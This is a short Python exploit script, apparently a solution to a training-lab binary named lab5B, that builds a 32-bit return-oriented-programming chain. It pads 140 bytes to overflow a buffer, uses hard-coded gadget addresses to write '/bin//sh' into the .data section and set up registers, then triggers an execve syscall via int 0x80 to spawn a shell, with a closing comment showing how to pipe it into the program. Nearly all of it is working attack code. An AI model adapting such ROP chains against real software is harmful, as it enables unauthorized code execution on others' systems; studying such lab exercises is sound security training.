# edx char *env
# ecx char **arguments
# ebx "/bin//sh"

# ROPgadget --ropchain --binary ./lab5B  - для поиска gadget

from struct import pack
import sys

stack     = pack("<I", 0x080eb060)  # .data
move      = pack("<I", 0x0809a95d)  # mov [edx], eax | ret
inc_a     = pack("<I", 0x0807b6b6)  # inc eax | ret
zero      = pack("<I", 0x080eb090)  # zero
pop_d_c_b = pack("<I", 0x0806ec80)  # pop edx | pop ecx | pop ebx | ret
pop_eax   = pack("<I", 0x080bbf26)  # pop eax | ret
xor_      = pack("<I", 0x0806b95d)  # xor eax,eax | ret
junk      = pack("<I", 0x41414141)  # junk
int_80    = pack("<I", 0x08049401)  # int 0x80

buf = ''
buf += 'A'*140
buf += pop_d_c_b
buf += stack
buf += junk
buf += junk
buf += pop_eax
buf += '/bin'
buf += move
buf += pop_d_c_b
buf += pack("<I", 0x080eb060 + 4)
buf += junk
buf += junk
buf += pop_eax
buf += '//sh'
buf += move
buf += xor_
buf += inc_a * 11
buf += pop_d_c_b
buf += zero
buf += zero
buf += stack
buf += int_80
sys.stdout.write(buf)

# (python  /tmp/rop.py; cat;) | ./lab5B
